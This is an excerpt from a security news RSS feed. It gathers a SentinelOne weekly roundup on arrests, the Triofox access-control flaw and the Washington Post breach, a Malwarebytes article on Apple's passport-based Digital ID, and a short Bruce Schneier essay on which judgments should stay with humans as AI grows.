]]></content:encoded></item><item><title>The Good, the Bad and the Ugly in Cybersecurity – Week 46</title><link>https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-46-7/</link><author>SentinelOne</author><category>threatintel</category><enclosure url="https://www.sentinelone.com/wp-content/uploads/2025/11/GBU_week46.jpg" length="" type=""/><pubDate>Fri, 14 Nov 2025 14:00:09 +0000</pubDate><source url="https://www.sentinelone.com/">SentinelOne Blog</source><content:encoded><![CDATA[The Good | FBI and Europol Arrest Ransomware Broker and Dismantle Major BotnetRussian national,  targeting at least eight U.S. companies from July 2021 to November 2022. Using aliases like “chubaka.kor” and “nets”, Volkov sold access to the ransomware group after breaching his victim’s corporate networks and demanding ransoms from $300,000 to $15 million in Bitcoin. FBI investigators traced Volkov through iCloud, cryptocurrency records, and social media, recovering chat logs, stolen credentials, and evidence of ransom negotiations, which all linked him to $1.5 million in collected payments.His breaches affected companies across multiple states, including banks, engineering firms, and telecoms. Volkov faces up to 53 years in prison and over $9.1 million in restitution for charges including trafficking in access, identity theft, computer fraud, and money laundering., an international effort against cybercrime. Coordinated by Europol and Eurojust with support from private partners, the action consisted of searches at 11 locations in Germany, Greece, and the Netherlands, where officers seized 20 domains and arrested a key VenomRAT suspect. The disrupted infrastructure involved hundreds of thousands of infected devices and millions of stolen credentials, including access to over 100,000 crypto wallets. Rhadamanthys, active since 2023, had seen rapid growth in late 2025, affecting thousands of IP addresses daily.Authorities recommend checking systems for infection via politie.nl/checkyourhack and haveibeenpwned.com. Operation Endgame has previously disrupted numerous malware and ransomware networks, including Bumblebee, IcedID, Pikabot, Smokeloader, SystemBC, and Trickbot, highlighting ongoing international efforts to curb cybercrime.The Bad | UNC6485 Exploits Triofox Vulnerability for Remote Code ExecutionThreat actors have . The vulnerability, tracked as CVE-2025-12480, allows attackers to abuse an access control logic error that grants admin privileges when the request host equals ‘localhost’. By spoofing this value in the HTTP host header, an attacker can reach sensitive setup pages without credentials, especially on systems where the  parameter was never configured.Security researchers first discovered an intrusion in August targeting a Triofox instance running version 16.4.10317.56372. They later determined that the threat cluster UNC6485 used a malicious HTTP GET request containing a localhost header to access the  setup page. Using this workflow, the attackers created a rogue administrator account called ‘Cluster Admin’, uploaded a malicious script, and configured Triofox to treat that script as the antivirus scanner path. .The payload then launches a PowerShell downloader to retrieve a Zoho UEMS installer, which subsequently deploys Zoho Assist and AnyDesk on the compromised host for remote access and lateral movement. The attackers were also observed using Plink and PuTTY to establish SSH tunnels and forward traffic to the compromised host’s RDP port.Gladinet has since fixed CVE-2025-12480 in Triofox version 16.7.10368.56560, and administrators are urged to update to the latest release (16.10.10408.56683), review admin accounts, and ensure the antivirus engine is not configured to run unauthorized binaries.The Ugly | Attackers Exploit Zero-Day to Steal Washington Post Employee DataThe Washington Post, one of the vendors impacted by a breach targeting Oracle software,  in the data theft campaign. The Post, one of the largest U.S. newspapers with 2.5 million digital subscribers, confirmed that attackers accessed parts of its network between July 10 and August 22 by exploiting a previously unknown zero-day vulnerability in Oracle E-Business Suite, the organization’s internal enterprise resource planning (ERP) system. The vulnerability is tracked as CVE-2025-61884.According to the letter sent to affected individuals, the Post learned of the intrusion after a threat actor contacted the company on September 29 claiming access to its Oracle applications. Post-breach investigations identified the widespread flaw that allowed the attackers to access many Oracle customers’ applications. The attackers used this flaw to steal sensitive data and later attempted to extort the Post and other organizations breached in the same campaign.Although the Post did not name the group responsible, The Post’s investigation has determined that data belonging to 9,720 individuals was compromised. Exposed information includes full names, Social Security numbers, tax and ID numbers, and bank account and routing numbers. Impacted individuals have been offered 12 months of free identity protection through IDX and advised to place credit freezes on their accounts and fraud alerts for additional protection.]]></content:encoded></item><item><title>Microsoft Office Russian Dolls, (Fri, Nov 14th)</title><link>https://isc.sans.edu/diary/rss/32484</link><author></author><category>threatintel</category><pubDate>Fri, 14 Nov 2025 13:42:55 +0000</pubDate><source url="https://isc.sans.edu/">SANS Internet Storm Center, InfoCON: green</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Your passport, now on your iPhone. Helpful or risky?</title><link>https://www.malwarebytes.com/blog/news/2025/11/your-passport-now-on-your-iphone-helpful-or-risky</link><author></author><category>threatintel</category><pubDate>Fri, 14 Nov 2025 12:17:21 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[Apple has launched Digital ID, a way for users in the US to create and present a government-issued ID in Apple Wallet using their passport information. For now, it works only for identity verification at Transportation Security Administration (TSA) checkpoints in more than 250 airports.Apple says the reason for the introduction is because users asked for it:“Since introducing the ability to add a driver’s license or state ID to Apple Wallet in 2022, we’ve seen how much users love having their ID right on their devices. Digital IDs brings this secure and convenient option to even more users across the country, as they can now add an ID to Wallet using information from their U.S. passport.”What does Apple’s Digital ID mean for users?You add a Digital ID by scanning your physical passport (photo page and chip) and taking a selfie as part of a verification process. Your ID stays encrypted on the device and isn’t shared with Apple.To present it, you hold your iPhone or Apple Watch near a reader and confirm with Face ID or Touch ID. You choose which information is shared, and you never have to unlock or hand over your device.At launch, it’s TSA-only. Apple says wider use at businesses, organizations, and online services will come later. Digital ID  replace a passport for international travel.Pros of Apple’s Digital ID:Quickly present your ID from your iPhone or Apple Watch for TSA security, and eventually, for businesses or online checks.The ID data is locally encrypted and requires biometric authentication for access. Users review and authorize the information shared, and Apple claims it doesn’t track when you use the ID.It’s helpful for people without a REAL ID-compliant driver’s license who want to fly domestically.You don’t hand over your device for inspection. You just present your phone or watch to a reader.Apple already has the support of states and airports, and plans to expand.The risks of using Apple’s Digital IDWe had to look at other sources to find some of the more serious downsides.Lose your phone or watch, and you lose access to your Digital ID. That’s not to mention the risks if the device is stolen.Privacy and surveillance: Experts warn Digital ID adoption may lead to more ID checks in places that didn’t require them before, increasing surveillance and data tracking concerns.​Potential for security breaches: Encrypted or not, digital IDs can still be targeted by device exploits, phishing, or social engineering.Face ID or Touch ID can, in some cases, be spoofed or exploited.​Apple’s system is closed, which means users are dependent on Apple’s legacy, update policies, and device ecosystem. If you switch platforms, you might find it hard to recover your digital ID. Critics worry police or other authorities could pressure users to unlock devices under the guise of ID verification.Data sharing with state authorities: Your photo, video, and limited device analytics may be shared temporarily with issuing authorities for verification.​Digital ID doesn’t replace your passport outside the US, so it’s not very useful for international travel, and it’s not accepted everywhere yet.Apple’s Digital ID aims to make ID checks private, more secure, and convenient for most users. But concerns remain regarding privacy, device loss, ecosystem lock-in, and the potential for expanded surveillance and demands in everyday activities beyond TSA checkpoints.We still see this option as safer than storing your ID in a browser, where attacks are far more common, but the drawbacks may still outweigh the benefits for many users. As one of our readers put it: “The inconvenience of having to look through a drawer for my passport is not that big, that I would risk having my identity stolen.”We don’t just report on threats—we help safeguard your entire digital identityCybersecurity risks should never spread beyond a headline. Protect your, and your family’s, personal information by using identity protection.]]></content:encoded></item><item><title>The Role of Humans in an AI-Powered World</title><link>https://www.schneier.com/blog/archives/2025/11/the-role-of-humans-in-an-ai-powered-world.html</link><author>Bruce Schneier</author><category>security</category><pubDate>Fri, 14 Nov 2025 12:00:33 +0000</pubDate><source url="https://www.schneier.com/">Schneier on Security</source><content:encoded><![CDATA[As AI capabilities grow, we must delineate the roles that should remain exclusively human. The line seems to be between fact-based decisions and judgment-based decisions.For example, in a medical context, if an AI was demonstrably better at reading a test result and diagnosing cancer than a human, you would take the AI in a second. You want the more accurate tool. But justice is harder because justice is inherently a human quality in a way that “Is this tumor cancerous?” is not. That’s a fact-based question. “What’s the right thing to do here?” is a human-based question.Chess provides a useful analogy for this evolution. For most of history, humans were best. Then, in the 1990s, Deep Blue beat the best human. For a while after that, a good human paired with a good computer could beat either one alone. But a few years ago, that changed again, and now the best computer simply wins. There will be an intermediate period for many applications where the human-AI combination is optimal, but eventually, for fact-based tasks, the best AI will likely surpass both.The enduring role for humans lies in making judgments, especially when values come into conflict. What is the proper immigration policy? There is no single “right” answer; it’s a matter of feelings, values, and what we as a society hold dear. A lot of societal governance is about resolving conflicts between people’s rights—my right to play my music versus your right to have quiet. There’s no factual answer there. We can imagine machines will help; perhaps once we humans figure out the rules, the machines can do the implementing and kick the hard cases back to us. But the fundamental value judgments will likely remain our domain.This essay originally appeared in IVY.]]></content:encoded></item></channel></rss>